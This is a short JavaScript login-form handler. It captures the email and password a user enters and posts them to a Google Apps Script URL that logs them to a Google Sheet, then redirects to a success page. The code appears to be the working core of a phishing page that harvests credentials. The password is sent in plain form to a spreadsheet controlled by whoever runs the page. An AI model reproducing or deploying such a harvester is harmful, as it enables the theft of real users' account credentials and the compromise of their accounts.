// Handle the form submission and send data to Google Sheets
function handleSubmit(event) {
    event.preventDefault(); // Prevent the form from submitting the traditional way

    // Get form data
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Prepare the data to send to Google Sheets
    const formData = new FormData();
    formData.append("email", email);
    formData.append("password", password);

    // First, disable the form and button to prevent multiple submissions
    const submitButton = document.querySelector("button[type='submit']");
    submitButton.disabled = true;
    submitButton.innerHTML = "Submitting..."; // Update button text

    // Send data to Google Sheets using fetch
    fetch('https://script.google.com/macros/s/AKfycbwb-eqY_s93FuDE_RzeUXc710tUDcoCmrLFklqc18sKYwNlXj0yWr7CAJQEr9Icgg0QFA/exec', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())  // Expecting JSON response from the server
    .then(data => {
        // Check if the submission was successful
        if (data.result === 'success') {
            // If successful, redirect to the success page
            window.location.href = "success.html";
        } else {
            alert("There was an error submitting your information. Please try again.");
            submitButton.disabled = false; // Re-enable the submit button
            submitButton.innerHTML = "Login"; // Reset button text
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("There was an error with the submission. Please try again.");
        submitButton.disabled = false; // Re-enable the submit button
        submitButton.innerHTML = "Login"; // Reset button text
    });
}
